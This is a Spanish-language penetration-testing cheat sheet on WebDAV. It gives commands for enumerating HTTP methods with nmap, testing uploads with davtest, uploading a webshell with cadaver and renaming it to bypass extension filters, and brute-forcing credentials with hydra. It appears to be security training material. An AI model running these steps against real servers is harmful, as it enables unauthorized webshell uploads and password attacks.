---
title: WebDAV (80 / 443)
pubDate: '2025-11-26'
---

## ¿Qué es WebDAV?
**WebDAV (Web Distributed Authoring and Versioning)** es una extensión del protocolo HTTP que permite a los usuarios gestionar y editar archivos en un servidor web. Básicamente, convierte un servidor web en una unidad de red compartida.

### Riesgos principales
Si el servidor tiene habilitados métodos como **PUT** o **MOVE** sin una autenticación robusta, un atacante puede subir archivos maliciosos (Webshells) y ejecutarlos en el servidor.

---

## 🔎 Enumeración y Detección

### 1. Identificar métodos HTTP permitidos
Es fundamental saber si el servidor permite subir o renombrar archivos.
```bash
nmap -p 80 --script http-methods --script-args http-methods.url-path='/webdav/' <IP>
```
*Vigila especialmente los métodos: `PUT`, `DELETE`, `COPY`, `MOVE` y `PROPFIND`.*

### 2. Test de vulnerabilidad con Davtest
Esta herramienta automatiza el proceso de intentar subir archivos con diferentes extensiones y verificar si son ejecutables.
```bash
# Testeo rápido (anónimo)
davtest -url http://<IP>/webdav/

# Testeo con credenciales conocidas
davtest -url http://<IP>/webdav/ -auth usuario:password
```

---

## 🚀 Explotación con Cadaver
**Cadaver** es la herramienta estándar para interactuar manualmente con directorios WebDAV de forma similar a un cliente FTP.

### Bypass de Filtros (Upload & Move)
Si el servidor no permite subir archivos ejecutables directamente (ej: `.php`, `.asp`), prueba a subirlo como `.txt` y luego cámbiale la extensión.

```bash
# Conectar al servidor
cadaver http://<IP>/webdav/

# Subir y renombrar (MOVE)
> put shell.txt
> move shell.txt shell.php    # Intentar evadir el filtro de extensión en la subida
> ls
> exit
```

---

## 🔑 Ataques de Diccionario
Si el directorio WebDAV pide contraseña (Error 401 Unauthorized), intenta fuerza bruta.
```bash
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt <IP> http-get /webdav/
```

> **Tip:** WebDAV suele ser una "puerta trasera" olvidada en servidores IIS de Windows. Si encuentras un IIS con el puerto 80 abierto, comprueba siempre la ruta `/webdav/`.
